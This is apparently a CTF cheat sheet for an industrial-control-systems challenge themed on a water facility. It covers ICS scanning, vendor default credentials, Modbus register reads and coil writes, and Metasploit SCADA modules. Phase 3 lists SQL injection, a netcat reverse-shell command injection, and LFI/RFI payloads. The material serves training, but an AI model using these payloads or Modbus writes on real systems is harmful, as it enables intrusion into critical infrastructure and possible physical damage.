# Industrial Intrusion CTF: The Ultimate Cheat Sheet

## **MISSION BRIEFING: OPERATION VIRELIA WATER**

**Situation:** The Virelia Water Control Facility is compromised. Our initial intel suggests a sophisticated attacker has breached their systems and left a persistent backdoor. They are still active.

**Your Objective:** You are being covertly inserted into their network. Your team's mission is to move through the facility's digital infrastructure, from the front-facing corporate systems to the core of their Industrial Control Systems (ICS). You will hunt for flags left as breadcrumbs, identify the attacker's hidden implant, and ultimately, understand their motives. This is a live environment; expect the unexpected.

**Flag Format:** `THM{some_text_here}`

---

## **PHASE 1: RECONNAISSANCE & INFILTRATION**

### **Network Discovery & ICS Fingerprinting**

Your first step is to map the network. Standard port scans are for script kiddies. We need surgical precision to identify the juicy ICS targets without raising alarms.

**Nmap - The Swiss Army Knife:**

* **Initial Sweep (All Ports, Service Versions):**
    ```bash
    nmap -sV -p- -T4 <TARGET_IP_RANGE> -oN nmap_initial_scan
    ```
    * `-sV`: Service version detection (crucial for identifying HMI software).
    * `-p-`: Scan all 65535 TCP ports. ICS services love non-standard ports.
    * `-T4`: Aggressive timing. You're on a mission, not a leisurely stroll.
    * `-oN`: Save the output for later analysis.

* **Targeted ICS Scan (Using Nmap Scripting Engine - NSE):**
    Once you have a list of IPs, run a more focused scan on potential ICS devices.
    ```bash
    nmap --script "modbus-discover,s7-info,enip-info" -p 502,102,44818 <TARGET_IP>
    ```
    * `--script "..."`:  This is where the magic happens. These scripts are specifically designed to query ICS services.
        * `modbus-discover`:  Probes for Modbus devices (port 502) and attempts to get Unit IDs.
        * `s7-info`:  Gathers detailed information from Siemens S7 PLCs (port 102).
        * `enip-info`:  Enumerates EtherNet/IP devices (port 44818).

| Protocol        | Default TCP Port | What It Is                                | Nmap NSE Script      |
| :-------------- | :--------------- | :---------------------------------------- | :------------------- |
| **Modbus** | 502              | Ubiquitous, simple master-slave protocol. | `modbus-discover`    |
| **DNP3** | 20000            | Common in utilities (water/electric).     | `dnp3-info`          |
| **S7** | 102              | Siemens PLC communication.                | `s7-info`            |
| **EtherNet/IP** | 44818            | Industrial Ethernet protocol.             | `enip-info`          |
| **HTTP/HTTPS** | 80, 443          | Your gateway to HMIs (Human-Machine Interfaces). | `http-enum`, `http-title` |

### **Web-Based HMI Exploitation**

HMIs are the control panels of the industrial world, and many are just glorified, and often insecure, web pages.

* **Directory & File Brute-Forcing (Gobuster):**
    Never underestimate what's left lying around.
    ```bash
    gobuster dir -u http://<HMI_IP> -w /usr/share/wordlists/dirb/common.txt -x .php,.bak,.txt,.old
    ```
    * **Look for:** `config.php.bak`, `backup.zip`, `manual.pdf`, `/api/`, `/admin/`

* **Vulnerability Scanning (Nikto):**
    Get a quick and dirty overview of potential vulnerabilities.
    ```bash
    nikto -h http://<HMI_IP>
    ```
    * **Focus on:** Outdated server software, default files, and configuration weaknesses.

* **Default Credentials - The Keys to the Kingdom:**
    ICS vendors are notorious for this. **ALWAYS TRY THESE FIRST.**

| Vendor/Software | Username | Password   |
| :-------------- | :------- | :--------- |
| Rockwell        | admin    | password   |
| Schneider       | admin    | admin      |
| Siemens         | admin    | admin      |
| **Generic** | admin    | 1234       |
| **Generic** | operator | operator   |
| **Generic** | root     | (blank)    |

> **[!] FURTHER RESEARCH AREA:** Research the specific HMI software you identify (e.g., "Wonderware," "Ignition," "WinCC"). Each has its own set of common vulnerabilities and default credentials.

---

## **PHASE 2: ICS PROTOCOL INTERACTION**

### **Modbus - The Workhorse**

Modbus is insecure by design—no authentication, no encryption. It's a goldmine.

**Modbus Concepts:**

* **Coils:** Read/Write, single-bit values (think On/Off).
* **Holding Registers:** Read/Write, 16-bit values (used for configuration and operational data).
* **Input Registers:** Read-Only, 16-bit values (from sensors).
* **Discrete Inputs:** Read-Only, single-bit values.

**Interacting with `modbus-cli`:**

* **Read 10 Holding Registers starting from address 0:**
    ```bash
    modbus-cli --host <TARGET_IP> read-holding-registers 0 10
    ```
* **Write the value 1 to a Coil at address 5 (e.g., turn on a pump):**
    ```bash
    modbus-cli --host <TARGET_IP> write-coil 5 1
    ```

**Flag Hunting in Modbus:** Flags can be hidden in registers. A sequence of register values might be ASCII characters.

* **Python `pymodbus` Script for Flag Hunting:**

    ```python
    from pymodbus.client.sync import ModbusTcpClient

    TARGET_IP = '<TARGET_IP>'
    client = ModbusTcpClient(TARGET_IP)
    client.connect()

    flag = ""
    # Let's assume the flag is in holding registers 100-120
    response = client.read_holding_registers(100, 20) 

    if not response.isError():
        for value in response.registers:
            # Each 16-bit register can hold two 8-bit ASCII characters
            high_byte = (value >> 8) & 0xff
            low_byte = value & 0xff
            if high_byte != 0:
                flag += chr(high_byte)
            if low_byte != 0:
                flag += chr(low_byte)

    print(f"Possible Flag: {flag}")
    client.close()
    ```

> **[!] FURTHER RESEARCH AREA:** Explore Modbus function codes. Codes like `Read/Write File Record` (Function 20/21) can sometimes be used to pull entire files or configuration data off a device.

---

## **PHASE 3: EXPLOITATION & PIVOTING**

### **Common Attack Vectors & Payloads**

* **SQL Injection (in HMI login/search fields):**
    ```sql
    ' OR 1=1 --
    ```
* **Command Injection (in HMI diagnostic pages):**
    ```
    ; ls -la
    ; nc -e /bin/bash <YOUR_IP> <YOUR_PORT>
    ```
* **Local/Remote File Inclusion (LFI/RFI):**
    ```
    ../../../../etc/passwd
    http://<YOUR_IP>/shell.txt
    ```

### **Metasploit for ICS**

Metasploit has a dedicated section for SCADA.

* **Launch and search for Modbus modules:**
    ```bash
    msfconsole
    search modbus
    ```
* **Example Module Usage (Modbus Scanner):**
    ```
    use auxiliary/scanner/scada/modbus_findunitid
    set RHOSTS <TARGET_IP>
    run
    ```

### **Post-Exploitation - What to Look For**

You have a foothold. Now what?

1.  **Find the Ladder Logic:** This is the code that runs on PLCs. It's often stored as files with extensions like `.L5K` or `.ACD`. Analyzing this logic can reveal exactly how the industrial process works and how to manipulate it.
2.  **Network Traffic Analysis:** If you can get a shell, run `tcpdump`. Capture traffic and analyze it with Wireshark to find other ICS devices, communication patterns, and credentials.
3.  **Hunt for Documents:** Look for PDFs, Word documents, and text files. Engineering diagrams, network maps, and operator manuals are invaluable.
4.  **Pivoting:** Use your compromised host to scan and attack deeper parts of the network that weren't accessible before.

Good luck, operator. Make us proud.
